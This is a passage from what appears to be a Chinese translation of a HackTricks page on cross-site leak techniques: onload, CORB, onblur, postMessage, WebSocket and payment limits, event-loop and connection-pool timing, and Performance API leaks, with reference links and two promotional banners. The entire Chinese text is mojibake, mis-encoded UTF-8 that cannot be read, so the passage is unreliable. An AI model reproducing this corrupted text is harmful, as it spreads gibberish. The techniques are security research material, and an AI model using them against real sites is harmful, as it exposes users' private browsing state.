å¦‚æœç¬¬ä¸€ä¸ªURL**æˆåŠŸåŠ è½½**ï¼Œé‚£ä¹ˆå½“**æ›´æ”¹**URLçš„**å“ˆå¸Œ**éƒ¨åˆ†æ—¶ï¼Œ**onload**äº‹ä»¶å°†**ä¸ä¼šå†æ¬¡è§¦å‘**ã€‚ä½†æ˜¯ï¼Œå¦‚æœé¡µé¢åœ¨åŠ è½½æ—¶å‡ºç°æŸç§**é”™è¯¯**ï¼Œåˆ™**onload**äº‹ä»¶å°†**å†æ¬¡è§¦å‘**ã€‚

ç„¶åï¼Œå¯ä»¥**åŒºåˆ†**æ­£ç¡®åŠ è½½çš„é¡µé¢æˆ–è®¿é—®æ—¶å‡ºç°é”™è¯¯çš„é¡µé¢ã€‚

### Javascript Execution

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š
* **æ‘˜è¦**ï¼šå¦‚æœé¡µé¢è¿”å›æ•æ„Ÿå†…å®¹ï¼Œæˆ–è€…ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„å†…å®¹ã€‚ç”¨æˆ·å¯ä»¥åœ¨å¦å®šæƒ…å†µä¸‹è®¾ç½®æœ‰æ•ˆçš„JSä»£ç ï¼Œå¹¶åœ¨æ¯æ¬¡å°è¯•ä¸­ä½¿ç”¨**`<script>`**æ ‡ç­¾è¿›è¡ŒåŠ è½½ï¼Œå› æ­¤åœ¨å¦å®šæƒ…å†µä¸‹ï¼Œæ”»å‡»è€…çš„ä»£ç å°†è¢«æ‰§è¡Œï¼Œè€Œåœ¨è‚¯å®šæƒ…å†µä¸‹å°†ä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}
### CORB - Onerror

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç å’Œå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **æ‘˜è¦**ï¼šæ”»å‡»è€…å¯ä»¥è§‚å¯Ÿåˆ°å½“CORBè¢«å¼ºåˆ¶æ‰§è¡Œæ—¶ï¼Œå¦‚æœå“åº”è¿”å›ä¸€ä¸ªå¸¦æœ‰çŠ¶æ€ç `2xx`çš„_CORBå—ä¿æŠ¤_`Content-Type`ï¼ˆå’Œ`nosniff`ï¼‰ï¼Œåˆ™CORBä¼šä»å“åº”ä¸­å‰¥ç¦»æ­£æ–‡å’Œå¤´éƒ¨ã€‚æ£€æµ‹åˆ°è¿™ç§ä¿æŠ¤å¯ä»¥ä½¿æ”»å‡»è€…**æ³„éœ²**ä¸¤è€…çš„ç»„åˆï¼Œå³**çŠ¶æ€ç **ï¼ˆæˆåŠŸä¸é”™è¯¯ï¼‰å’Œ**`Content-Type`**ï¼ˆæ˜¯å¦å—CORBä¿æŠ¤ï¼‰ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

æŸ¥çœ‹æ›´å¤šä¿¡æ¯é“¾æ¥ä»¥äº†è§£æœ‰å…³æ”»å‡»çš„æ›´å¤šä¿¡æ¯ã€‚

### onblur

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **æ‘˜è¦**ï¼šä»idæˆ–nameå±æ€§ä¸­æ³„éœ²æ•æ„Ÿæ•°æ®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

å¯ä»¥**åœ¨iframeä¸­åŠ è½½é¡µé¢**å¹¶ä½¿ç”¨`#id_value`æ¥ä½¿é¡µé¢**èšç„¦åœ¨iframeçš„å…ƒç´ **ä¸Šï¼Œå¦‚æœè§¦å‘äº†**`onblur`**ä¿¡å·ï¼Œåˆ™IDå…ƒç´ å­˜åœ¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨**`portal`**æ ‡ç­¾æ‰§è¡Œç›¸åŒçš„æ”»å‡»ã€‚

### postMessageå¹¿æ’­ <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šAPIä½¿ç”¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **æ‘˜è¦**ï¼šä»postMessageä¸­æ”¶é›†æ•æ„Ÿä¿¡æ¯ï¼Œæˆ–è€…ä½¿ç”¨postMessageçš„å­˜åœ¨ä½œä¸ºä¸€ä¸ªoracleæ¥äº†è§£ç”¨æˆ·åœ¨é¡µé¢ä¸­çš„çŠ¶æ€ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š`ä»»ä½•ç›‘å¬æ‰€æœ‰postMessagesçš„ä»£ç ã€‚`

åº”ç”¨ç¨‹åºé€šå¸¸ä½¿ç”¨[postMessageå¹¿æ’­](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)ä¸å…¶ä»–æ¥æºå…±äº«ä¿¡æ¯ã€‚é€šè¿‡ç›‘å¬è¿™äº›æ¶ˆæ¯ï¼Œå¯ä»¥æ‰¾åˆ°**æ•æ„Ÿä¿¡æ¯**ï¼ˆå¦‚æœæœªä½¿ç”¨`targetOrigin`å‚æ•°ï¼‰ã€‚æ­¤å¤–ï¼Œæ¥æ”¶åˆ°æŸäº›æ¶ˆæ¯çš„äº‹å®å¯ä»¥è¢«ç”¨ä½œ**oracle**ï¼ˆåªæœ‰åœ¨ç™»å½•æ—¶æ‰ä¼šæ”¶åˆ°æ­¤ç±»æ¶ˆæ¯ï¼‰ã€‚

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œä½¿ç”¨å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## å…¨å±€é™åˆ¶æŠ€æœ¯

### WebSocket API

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šAPIä½¿ç”¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **æ‘˜è¦**ï¼šè€—å°½WebSocketè¿æ¥é™åˆ¶ä¼šæ³„éœ²è·¨æºé¡µé¢çš„WebSocketè¿æ¥æ•°é‡ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

å¯ä»¥ç¡®å®šç›®æ ‡é¡µé¢ä½¿ç”¨äº†å¤šå°‘ä¸ªWebSocketè¿æ¥ã€‚è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥æ£€æµ‹åº”ç”¨ç¨‹åºçŠ¶æ€å¹¶æ³„éœ²ä¸WebSocketè¿æ¥æ•°é‡ç›¸å…³çš„ä¿¡æ¯ã€‚

å¦‚æœä¸€ä¸ª**æº**ä½¿ç”¨äº†**æœ€å¤§æ•°é‡çš„WebSocket**è¿æ¥å¯¹è±¡ï¼Œæ— è®ºå®ƒä»¬çš„è¿æ¥çŠ¶æ€å¦‚ä½•ï¼Œåˆ›å»º**æ–°å¯¹è±¡å°†å¯¼è‡´JavaScriptå¼‚å¸¸**ã€‚ä¸ºæ‰§è¡Œæ­¤æ”»å‡»ï¼Œæ”»å‡»è€…çš„ç½‘ç«™åœ¨å¼¹å‡ºçª—å£æˆ–iframeä¸­æ‰“å¼€ç›®æ ‡ç½‘ç«™ï¼Œç„¶ååœ¨ç›®æ ‡ç½‘ç«™åŠ è½½å®Œæˆåï¼Œå°è¯•åˆ›å»ºå°½å¯èƒ½å¤šçš„WebSocketè¿æ¥ã€‚**æŠ›å‡ºçš„å¼‚å¸¸æ•°é‡**å°±æ˜¯ç›®æ ‡ç½‘ç«™çª—å£ä½¿ç”¨çš„**WebSocketè¿æ¥æ•°é‡**ã€‚

### Payment API

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šAPIä½¿ç”¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **æ‘˜è¦**ï¼šæ£€æµ‹æ”¯ä»˜è¯·æ±‚ï¼Œå› ä¸ºä¸€æ¬¡åªèƒ½æœ‰ä¸€ä¸ªæ”¯ä»˜è¯·æ±‚å¤„äºæ´»åŠ¨çŠ¶æ€ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

è¿™ç§XS-Leakä½¿æ”»å‡»è€…èƒ½å¤Ÿ**æ£€æµ‹è·¨æºé¡µé¢ä½•æ—¶å‘èµ·æ”¯ä»˜è¯·æ±‚**ã€‚

å› ä¸º**ä¸€æ¬¡åªèƒ½æœ‰ä¸€ä¸ªæ”¯ä»˜è¯·æ±‚å¤„äºæ´»åŠ¨çŠ¶æ€**ï¼Œå¦‚æœç›®æ ‡ç½‘ç«™æ­£åœ¨ä½¿ç”¨Payment Request APIï¼Œä»»ä½•**è¿›ä¸€æ­¥å°è¯•ä½¿ç”¨æ­¤APIæ˜¾ç¤ºæ”¯ä»˜è¯·æ±‚å°†å¤±è´¥**ï¼Œå¹¶å¼•å‘**JavaScriptå¼‚å¸¸**ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡**å®šæœŸå°è¯•æ˜¾ç¤ºPayment API UI**æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚å¦‚æœä¸€æ¬¡å°è¯•å¼•å‘å¼‚å¸¸ï¼Œè¡¨ç¤ºç›®æ ‡ç½‘ç«™å½“å‰æ­£åœ¨ä½¿ç”¨å®ƒã€‚æ”»å‡»è€…å¯ä»¥åœ¨åˆ›å»ºåç«‹å³å…³é—­UIï¼Œä»¥éšè—è¿™äº›å®šæœŸå°è¯•ã€‚

### è®¡æ—¶äº‹ä»¶å¾ªç¯ <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **åŒ…å«æ–¹æ³•**ï¼š
* **å¯æ£€æµ‹å·®å¼‚**ï¼šè®¡æ—¶ï¼ˆé€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ç å¼•èµ·ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **æ‘˜è¦**ï¼šé€šè¿‡æ»¥ç”¨å•çº¿ç¨‹JSäº‹ä»¶å¾ªç¯æ¥æµ‹é‡ç½‘é¡µçš„æ‰§è¡Œæ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScriptçš„å¹¶å‘æ¨¡å‹åŸºäº[å•çº¿ç¨‹äº‹ä»¶å¾ªç¯](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop)ï¼Œè¿™æ„å‘³ç€**ä¸€æ¬¡åªèƒ½è¿è¡Œä¸€ä¸ªä»»åŠ¡**ã€‚é€šè¿‡æµ‹é‡ä»£ç ä»ä¸åŒæºè¿è¡Œæ‰€éœ€çš„æ—¶é—´ï¼Œå¯ä»¥æ¨æ–­å‡º**ä»£ç è¿è¡Œçš„æ—¶é—´**ã€‚æ”»å‡»è€…é€šè¿‡å‘äº‹ä»¶å¾ªç¯å‘é€å…·æœ‰å›ºå®šå±æ€§çš„äº‹ä»¶ï¼Œå¦‚æœæ± ä¸ºç©ºï¼Œè¿™äº›äº‹ä»¶æœ€ç»ˆä¼šè¢«åˆ†æ´¾ã€‚å…¶ä»–æºå°†äº‹ä»¶åˆ†æ´¾åˆ°åŒä¸€ä¸ªæ± ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ£€æµ‹å…¶ä»»åŠ¡æ˜¯å¦å‘ç”Ÿå»¶è¿Ÿæ¥æ¨æ–­æ—¶é—´å·®å¼‚ã€‚

{% hint style="warning" %}
åœ¨æ‰§è¡Œè®¡æ—¶ä¸­ï¼Œå¯ä»¥**æ¶ˆé™¤****ç½‘ç»œå› ç´ **ä»¥è·å¾—**æ›´ç²¾ç¡®çš„æµ‹é‡ç»“æœ**ã€‚ä¾‹å¦‚ï¼Œåœ¨åŠ è½½é¡µé¢ä¹‹å‰åŠ è½½é¡µé¢ä½¿ç”¨çš„èµ„æºã€‚
{% endhint %}
### ç¹å¿™çš„äº‹ä»¶å¾ªç¯ <a href="#busy-event-loop" id="busy-event-loop"></a>

* **åŒ…å«æ–¹æ³•**ï¼š
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šæ—¶é—´ï¼ˆé€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ç å¼•èµ·ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **æ‘˜è¦**ï¼šæµ‹é‡ç½‘é¡µé”å®šçº¿ç¨‹çš„äº‹ä»¶å¾ªç¯çš„æ‰§è¡Œæ—¶é—´ï¼Œå¹¶è®¡æ—¶**äº‹ä»¶å¾ªç¯å†æ¬¡å¯ç”¨æ‰€éœ€çš„æ—¶é—´**ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

è¿™ç§æŠ€æœ¯çš„ä¸»è¦ä¼˜ç‚¹ä¹‹ä¸€æ˜¯å…¶èƒ½å¤Ÿè§„é¿ç«™ç‚¹éš”ç¦»ï¼Œå› ä¸ºæ”»å‡»è€…çš„æ¥æºå¯ä»¥å½±å“å¦ä¸€ä¸ªæ¥æºçš„æ‰§è¡Œã€‚

{% hint style="warning" %}
åœ¨æ‰§è¡Œè®¡æ—¶ä¸­ï¼Œå¯ä»¥**æ¶ˆé™¤****ç½‘ç»œå› ç´ **ä»¥è·å¾—**æ›´ç²¾ç¡®çš„æµ‹é‡ç»“æœ**ã€‚ä¾‹å¦‚ï¼Œåœ¨åŠ è½½é¡µé¢ä¹‹å‰åŠ è½½é¡µé¢ä½¿ç”¨çš„èµ„æºã€‚
{% endhint %}

### è¿æ¥æ± 

* **åŒ…å«æ–¹æ³•**ï¼šJavaScript è¯·æ±‚
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šæ—¶é—´ï¼ˆé€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ç å¼•èµ·ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **æ‘˜è¦**ï¼šæ”»å‡»è€…å¯ä»¥é”å®šé™¤ 1 ä¸ªä¹‹å¤–çš„æ‰€æœ‰å¥—æ¥å­—ï¼ŒåŠ è½½ç›®æ ‡ç½‘é¡µå¹¶åŒæ—¶åŠ è½½å¦ä¸€ä¸ªé¡µé¢ï¼Œæœ€åä¸€ä¸ªé¡µé¢å¼€å§‹åŠ è½½çš„æ—¶é—´å°±æ˜¯ç›®æ ‡é¡µé¢åŠ è½½æ‰€èŠ±è´¹çš„æ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

æµè§ˆå™¨ä½¿ç”¨å¥—æ¥å­—ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ã€‚ç”±äºæ“ä½œç³»ç»ŸåŠå…¶è¿è¡Œçš„ç¡¬ä»¶èµ„æºæœ‰é™ï¼Œ**æµè§ˆå™¨å¿…é¡»æ–½åŠ é™åˆ¶**ã€‚ä¸ºäº†åˆ©ç”¨è¿™ä¸ªé™åˆ¶çš„å­˜åœ¨ï¼Œæ”»å‡»è€…å¯ä»¥ï¼š

1. æ£€æŸ¥æµè§ˆå™¨çš„é™åˆ¶ï¼Œä¾‹å¦‚å…¨å±€å¥—æ¥å­—çš„æ•°é‡ä¸º 256ã€‚
2. é€šè¿‡å¯¹ä¸åŒä¸»æœºæ‰§è¡Œ 255 ä¸ªè¯·æ±‚æ¥é•¿æ—¶é—´é˜»å¡ 255 ä¸ªå¥—æ¥å­—ï¼Œä½¿å…¶æ— æ³•ä½¿ç”¨ã€‚
3. é€šè¿‡å¯¹ç›®æ ‡é¡µé¢æ‰§è¡Œä¸€ä¸ªè¯·æ±‚æ¥ä½¿ç”¨ç¬¬ 256 ä¸ªå¥—æ¥å­—ã€‚
4. å¯¹å¦ä¸€ä¸ªä¸»æœºæ‰§è¡Œç¬¬ 257 ä¸ªè¯·æ±‚ã€‚ç”±äºåœ¨æ­¥éª¤ 2 å’Œ 3 ä¸­æ‰€æœ‰å¥—æ¥å­—éƒ½è¢«ä½¿ç”¨ï¼Œæ­¤è¯·æ±‚å¿…é¡»ç­‰å¾…ç›´åˆ°è¿æ¥æ± æ¥æ”¶åˆ°ä¸€ä¸ªå¯ç”¨çš„å¥—æ¥å­—ã€‚è¿™ä¸ªç­‰å¾…æ—¶é—´æä¾›ç»™æ”»å‡»è€…ç›®æ ‡é¡µé¢çš„ç½‘ç»œè®¡æ—¶ï¼Œè¯¥è®¡æ—¶å±äºç¬¬ 256 ä¸ªå¥—æ¥å­—ã€‚è¿™æ˜¯å› ä¸ºæ­¥éª¤ 2 ä¸­çš„ 255 ä¸ªå¥—æ¥å­—ä»ç„¶è¢«é˜»å¡ï¼Œæ‰€ä»¥å¦‚æœè¿æ¥æ± æ¥æ”¶åˆ°ä¸€ä¸ªå¯ç”¨çš„å¥—æ¥å­—ï¼Œé‚£æ˜¯å› ä¸ºåœ¨æ­¥éª¤ 3 ä¸­é‡Šæ”¾äº†å¥—æ¥å­—ã€‚é‡Šæ”¾ç¬¬ 256 ä¸ªå¥—æ¥å­—çš„æ—¶é—´ä¸å®Œæˆè¯·æ±‚æ‰€èŠ±è´¹çš„æ—¶é—´ç›´æ¥ç›¸å…³ã€‚

äº†è§£æ›´å¤šä¿¡æ¯ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### æŒ‰ç›®æ ‡çš„è¿æ¥æ± 

* **åŒ…å«æ–¹æ³•**ï¼šJavaScript è¯·æ±‚
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šæ—¶é—´ï¼ˆé€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ç å¼•èµ·ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š
* **æ‘˜è¦**ï¼šè¿™ä¸å‰ä¸€ç§æŠ€æœ¯ç±»ä¼¼ï¼Œä½†æ˜¯è°·æ­Œ**Chrome**å°†**å¯¹åŒä¸€æºçš„å¹¶å‘è¯·æ±‚é™åˆ¶ä¸º 6 ä¸ª**ã€‚å¦‚æœæˆ‘ä»¬**é˜»å¡ 5 ä¸ª**è¯·æ±‚ï¼Œç„¶å**å‘èµ·ç¬¬ 6 ä¸ª**è¯·æ±‚å¹¶è®¡æ—¶å®ƒï¼Œå¦‚æœæˆ‘ä»¬æˆåŠŸä½¿**å—å®³è€…é¡µé¢å‘é€**æ›´å¤š**è¯·æ±‚**åˆ°åŒä¸€ç«¯ç‚¹ä»¥æ£€æµ‹**é¡µé¢**çš„**çŠ¶æ€**ï¼Œ**ç¬¬ 6 ä¸ªè¯·æ±‚**å°†èŠ±è´¹**æ›´é•¿çš„æ—¶é—´**ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æµ‹åˆ°å®ƒã€‚

##

![](<../.gitbook/assets/image (9) (1) (2).png>)

ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œä½¿ç”¨å…¨çƒ**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## æ€§èƒ½ API æŠ€æœ¯

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance)æä¾›äº†ä¸æ€§èƒ½ç›¸å…³çš„ä¿¡æ¯ï¼Œé€šè¿‡[`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API)çš„æ•°æ®å¢å¼ºï¼Œè¯¥ API æä¾›äº†ç½‘ç»œè¯·æ±‚çš„æ—¶é—´ï¼Œå¦‚æŒç»­æ—¶é—´ï¼Œä½†å½“æœåŠ¡å™¨å‘é€äº†`Timing-Allow-Origin: *`å¤´æ—¶ï¼Œè¿˜æä¾›äº†ä¼ è¾“å¤§å°å’ŒåŸŸåæŸ¥æ‰¾æ—¶é—´ã€‚\
å¯ä»¥ä½¿ç”¨[`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries)æˆ–[`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName)æ¥è®¿é—®è¿™äº›æ•°æ®ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å·®å€¼[`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now)æ¥è·å–æ‰§è¡Œæ—¶é—´ï¼Œä½†æ˜¯å¯¹äº Chrome çš„ fetch æ¥è¯´ï¼Œè¿™ä¼¼ä¹ä¸å¤ªç²¾ç¡®ï¼Œå› ä¸ºå®ƒåªæä¾›æ¯«ç§’çº§åˆ«çš„æ—¶é—´ã€‚

è¯¥ API å¯ç”¨äºæµ‹é‡è¯·æ±‚çš„æ—¶é—´æˆ–æ£€æµ‹ä½¿ç”¨ X-Frame-Options çš„æƒ…å†µï¼Œå› ä¸ºåœ¨ Chrome ä¸­ï¼Œè¢«é˜»æ­¢çš„é¡µé¢ä¸ä¼šè¢«æ·»åŠ åˆ°`performance`å¯¹è±¡ä¸­ã€‚

### é”™è¯¯æ³„æ¼

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼ŒHTML å…ƒç´ 
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šå¯¼è‡´é”™è¯¯çš„è¯·æ±‚ä¸ä¼šåˆ›å»ºèµ„æºè®¡æ—¶æ¡ç›®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

å¯ä»¥é€šè¿‡è¯·æ±‚å¯¼è‡´**é”™è¯¯**çš„æ–¹å¼æ¥**åŒºåˆ† HTTP å“åº”çŠ¶æ€ç **ï¼Œå› ä¸ºå¯¼è‡´**é”™è¯¯**çš„è¯·æ±‚ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®ã€‚

### æ ·å¼é‡æ–°åŠ è½½é”™è¯¯

* **åŒ…å«æ–¹æ³•**ï¼šHTML å…ƒç´ 
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šç”±äºæµè§ˆå™¨çš„é”™è¯¯ï¼Œå¯¼è‡´é”™è¯¯çš„è¯·æ±‚ä¼šåŠ è½½ä¸¤æ¬¡ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

åœ¨å‰ä¸€ç§æŠ€æœ¯ä¸­ï¼Œè¿˜å‘ç°äº†ä¸¤ç§æƒ…å†µï¼Œå³æµè§ˆå™¨ä¸­çš„ GC é”™è¯¯å¯¼è‡´**èµ„æºåŠ è½½å¤±è´¥æ—¶åŠ è½½ä¸¤æ¬¡**ã€‚è¿™å°†å¯¼è‡´æ€§èƒ½ API ä¸­å‡ºç°å¤šä¸ªæ¡ç›®ï¼Œå› æ­¤å¯ä»¥æ£€æµ‹åˆ°è¿™ç§æƒ…å†µã€‚
### è¯·æ±‚åˆå¹¶é”™è¯¯

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šå¯¼è‡´é”™è¯¯çš„è¯·æ±‚æ— æ³•åˆå¹¶ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

è¯¥æŠ€æœ¯åœ¨æåˆ°çš„è®ºæ–‡ä¸­çš„ä¸€ä¸ªè¡¨æ ¼ä¸­æ‰¾åˆ°ï¼Œä½†æ²¡æœ‰æ‰¾åˆ°å…³äºè¯¥æŠ€æœ¯çš„æè¿°ã€‚ç„¶è€Œï¼Œæ‚¨å¯ä»¥åœ¨[https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)ä¸­æ‰¾åˆ°æ£€æŸ¥è¯¥æŠ€æœ¯çš„æºä»£ç ã€‚

### ç©ºé¡µé¢æ³„æ¼

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šç©ºå“åº”ä¸ä¼šåˆ›å»ºèµ„æºè®¡æ—¶æ¡ç›®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

æ”»å‡»è€…å¯ä»¥æ£€æµ‹è¯·æ±‚æ˜¯å¦å¯¼è‡´ç©ºçš„HTTPå“åº”ä½“ï¼Œå› ä¸º**ç©ºé¡µé¢åœ¨æŸäº›æµè§ˆå™¨ä¸­ä¸ä¼šåˆ›å»ºæ€§èƒ½æ¡ç›®**ã€‚

### XSS-Auditoræ³„æ¼

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **æ‘˜è¦**ï¼šä½¿ç”¨XSS-Auditoråœ¨SAä¸­æ£€æµ‹ç½‘é¡µä¸­ç‰¹å®šå…ƒç´ çš„å­˜åœ¨ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

